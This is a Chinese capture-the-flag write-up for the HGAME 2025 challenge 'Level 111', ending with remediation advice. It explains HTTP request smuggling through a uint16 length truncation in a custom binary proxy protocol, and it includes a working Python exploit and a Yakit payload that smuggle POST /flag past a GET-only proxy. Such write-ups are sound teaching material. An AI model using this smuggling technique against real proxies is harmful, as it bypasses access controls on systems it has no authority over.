# HGAME 2025 Level 111 不存在的车厢

## 题目简述

题目前端代理只允许外部 HTTP `GET`，后端 `/flag` 却只接受 `POST`。代理与后端之间使用自定义 H111 二进制协议，并复用连接。H111 把各字段编码成 `Length + Data`，但写入 body 长度时直接缩窄为 `uint16`，仍继续写入完整 body。构造一个恰好为 $2^{16}=65536$ 字节的外层请求体后，线上长度变成 0，而真实的 65536 字节会残留在后端连接中并被当作后续 H111 请求解析，从而走私 `POST /flag`。

决定性漏洞是“整数截断造成解析边界分歧”，连接池只是让这段分歧能够跨请求被利用。

## 解题过程

### 1. 确认前后端方法限制

题目由外部 HTTP 代理和内部 H111 服务组成：

- 外部代理对参赛者开放 HTTP，但只放行 `GET`；
- 内部服务存在 `/flag`，且只有 `POST /flag` 才返回 flag；
- 代理将 HTTP 请求序列化成 H111 后写入一个可复用的后端 TCP 连接。

因此，直接请求 `GET /flag` 会被后端拒绝，直接发送 `POST /flag` 又会在前端被拦截。需要让前端看到 `GET`，让后端额外解析出一个 `POST`。

### 2. 分析 H111 编码

H111 请求按以下顺序编码，各长度和计数字段均为 2 字节大端整数：

```text
uint16 methodLength
byte[] method
uint16 uriLength
byte[] uri
uint16 headerCount
    uint16 keyLength + key
    uint16 valueLength + value
    ...
uint16 bodyLength
byte[] body
```

问题在于序列化器把实际长度直接转换为 `uint16`，没有在写入 body 前检查是否超过 65535。于是：

$$
65536 \bmod 2^{16}=0
$$

如果外层 HTTP body 是 65536 字节，代理会把 H111 的 `bodyLength` 写成 `0x0000`，却仍把全部 body 字节接在后面。后端读取第一条 H111 请求时认为 body 为空，剩余字节则停留在同一 TCP 字节流中。

### 3. 序列化内部的 `POST /flag`

可以复用题目 `WriteH111Request` 写一个单元测试：

```go
func TestGenRequest(t *testing.T) {
    var buf bytes.Buffer
    err := WriteH111Request(&buf, &http.Request{
        Method:     "POST",
        RequestURI: "/flag",
    })
    if err != nil {
        t.Fatalf("expected no error, got %v", err)
    }

    t.Log(len(buf.Bytes()))
    t.Log(hex.EncodeToString(buf.Bytes()))
}
```

运行 `go test -v` 得到 17 字节编码：

```text
0004504f535400052f666c616700000000
```

逐段解释如下：

```text
0004  504f5354        methodLength=4, method="POST"
0005  2f666c6167      uriLength=5, uri="/flag"
0000                  headerCount=0
0000                  bodyLength=0
```

视觉核对原 PDF 后确认，正确十六进制串是上述 34 个十六进制字符；其中 `POST` 前只有长度字段 `0004`，不能误抄成 `0004504f...` 之外的排列。

### 4. 填充到 65536 字节

内部请求占 17 字节，因此还需填充：

$$
65536-17=65519
$$

个零字节。Yakit fuzztag 形式为：

```http
GET / HTTP/1.1
Host: <challenge-host>
Content-Type: application/octet-stream

{{hexdec(0004504f535400052f666c616700000000)}}{{padding:zero(0|65519)}}
```

若用 Python 构造，核心字节序列为：

```python
post_h111 = (
    b"\x00\x04" + b"POST" +
    b"\x00\x05" + b"/flag" +
    b"\x00\x00" +       # headerCount = 0
    b"\x00\x00"         # bodyLength = 0
)

assert len(post_h111) == 17
payload = post_h111 + b"\x00" * (65536 - len(post_h111))
assert len(payload) == 65536
```

代理序列化外层 `GET` 时，body 的长度字段溢出为 0；后端先处理无 body 的 `GET`，随后从残留字节开头读到完整的 `POST /flag` 并生成第二份响应。

### 5. 取回被走私请求的响应

前端对一次外部请求只读取一份后端响应。`POST /flag` 产生的第二份响应会留在被复用的后端连接上；下一次外部请求若恰好取到同一连接，代理首先读到的就是这份滞留响应。

可重复发送“污染连接 + 普通 GET”来等待连接池命中：

```python
import requests

url = "http://<challenge-host>/"

post_h111 = (
    b"\x00\x04" + b"POST" +
    b"\x00\x05" + b"/flag" +
    b"\x00\x00" +
    b"\x00\x00"
)
payload = post_h111 + b"\x00" * (65536 - len(post_h111))

for _ in range(30):
    requests.get(
        url,
        data=payload,
        headers={"Content-Type": "application/octet-stream"},
        timeout=5,
    )

    response = requests.get(url, timeout=5)
    if "hgame{" in response.text:
        print(response.text)
        break
```

命中目标后端连接时，第二个请求的响应体即为 flag。原 PDF 没有记录具体 flag 字符串，因此不补造。

## 方法总结

利用链可概括为：

```text
外部 GET 携带 65536 字节 body
        ↓
uint16(65536) = 0，但 body 仍被写入
        ↓
前后端对第一条 H111 请求边界产生分歧
        ↓
残留字节被解析为 POST /flag
        ↓
下一次复用连接时取回滞留响应
```

这类问题不能只修补 `/flag` 路由。序列化器必须在任何缩窄转换前验证长度不超过 `uint16` 上限，并确保“声明长度”与“实际写入长度”完全一致；连接复用层还应在归还连接前确认响应已经消费完毕、连接上没有未配对数据。否则，任何协议边界分歧都可能升级为请求走私。
